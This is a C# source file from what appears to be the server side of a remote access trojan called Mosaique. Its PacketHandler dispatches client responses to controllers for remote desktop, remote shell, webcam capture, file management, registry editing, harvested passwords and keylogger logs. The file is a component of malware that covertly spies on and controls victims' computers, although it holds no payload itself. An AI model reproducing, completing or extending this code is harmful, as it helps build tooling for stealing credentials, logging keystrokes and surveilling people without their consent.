using MosaiqueServeur.Controllers;
using MosaiqueServeur.Packets.ClientPackets;
using Serveur.Controllers;
using Serveur.Controllers.Server;
using Serveur.Packets.ClientPackets;
using System.Windows.Forms;

namespace Serveur.Packets
{
    public static class PacketHandler
    {
        public static void packetChecker(ClientMosaique client, IPackets packet)
        {
            var type = packet.Type;

            if (type == TypePackets.SetStatus)
            {
                //Views.FrmMain.instance.setWarning((SetStatus)packet);
            }
            else if (type == TypePackets.GetMonitorsResponse)
            {
                FrmRemoteDesktopController.getMonitorsResponse(client, (GetMonitorsResponse)packet);
            }
            else if(type == TypePackets.GetDesktopResponse)
            {
                FrmRemoteDesktopController.getDesktopResponse(client, (GetDesktopResponse)packet);
            }
            else if (type == TypePackets.GetExecuteShellCmdResponse)
            {
                FrmRemoteShellController.getShellCmdExecuteResponse(client, (GetExecuteShellCmdResponse)packet);
            }
            else if (type == TypePackets.GetAvailableWebcamsResponse)
            {
                FrmRemoteWebcamController.getAvailableWebcamsResponse(client, (GetAvailableWebcamsResponse)packet);
            }
            else if (type == TypePackets.GetWebcamResponse)
            {
                FrmRemoteWebcamController.getWebcamResponse(client, (GetWebcamResponse)packet);
            }
            else if (type == TypePackets.GetDrivesResponse)
            {
                FrmFileManagerController.getDrivesResponse(client, (GetDrivesResponse)packet);
            }
            else if (type == TypePackets.GetDirectoryResponse)
            {
                FrmFileManagerController.getDirectoryResponse(client, (GetDirectoryResponse)packet);
            }
            else if (type == TypePackets.SetStatusFileManager)
            {
                FrmFileManagerController.setStatusFileManager(client, (SetStatusFileManager)packet);         
            }
            else if (type == TypePackets.DoDownloadFileResponse)
            {
                FrmFileManagerController.doDownloadFileResponse(client, (DoDownloadFileResponse)packet);
            }
            else if (type == TypePackets.GetProcessesResponse)
            {
                FrmTaskManagerController.getProcessesResponse(client, (GetProcessesResponse)packet);
            }
            else if (type == TypePackets.GetSysInfoResponse)
            {
                //System.Windows.Forms.MessageBox.Show("RECU");
                FrmSysInfoController.getSysInfoResponse(client, (GetSysInfoResponse)packet);
            }
            else if (type == TypePackets.GetStartupItemsResponse)
            {
                FrmStartupManagerController.getStartupItemsResponse(client, (GetStartupItemsResponse)packet);
            }
            else if (type == TypePackets.GetPasswordsResponse)
            {
                FrmPasswordRecoveryController.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
            }
            else if (type == TypePackets.GetKeyLoggerLogsResponse)
            {
                FrmKeyLoggerController.getKeyLoggerLogsResponse(client, (GetKeyLoggerLogsResponse)packet);
            }
            else if (type == TypePackets.MsgToRemoteChat)
            {
                FrmRemoteChatController.msgFromRemoteChat(client, (MosaiqueServeur.Packets.ServerPackets.MsgToRemoteChat)packet);
            }
            else if (type == TypePackets.GetRegistryKeysResponse)
            {
                FrmRegistryEditorController.loadRegistryKey((GetRegistryKeysResponse)packet, client);
            }
            else if (type == TypePackets.GetCreateRegistryKeyResponse)
            {
                FrmRegistryEditorController.createRegistryKey((GetCreateRegistryKeyResponse)packet, client);
            }
            else if (type == TypePackets.GetRenameRegistryKeyResponse)
            {
                FrmRegistryEditorController.renameRegistryKey((GetRenameRegistryKeyResponse)packet, client);
            }
            else if (type == TypePackets.GetDeleteRegistryKeyResponse)
            {
                FrmRegistryEditorController.deleteRegistryKey((GetDeleteRegistryKeyResponse)packet, client);
            }
            else if (type == TypePackets.GetCreateRegistryValueResponse)
            {
                FrmRegistryEditorController.createRegistryValue((GetCreateRegistryValueResponse)packet, client);
            }
            else if (type == TypePackets.GetRenameRegistryValueResponse)
            {
                FrmRegistryEditorController.renameRegistryValue((GetRenameRegistryValueResponse)packet, client);
            }
            else if (type == TypePackets.GetChangeRegistryValueResponse)
            {
                FrmRegistryEditorController.changeRegistryValue((GetChangeRegistryValueResponse)packet, client);
            }
            else if (type == TypePackets.GetDeleteRegistryValueResponse)
            {
                FrmRegistryEditorController.deleteRegistryValueResponse((GetDeleteRegistryValueResponse)packet, client);
            }
        }
    }
}
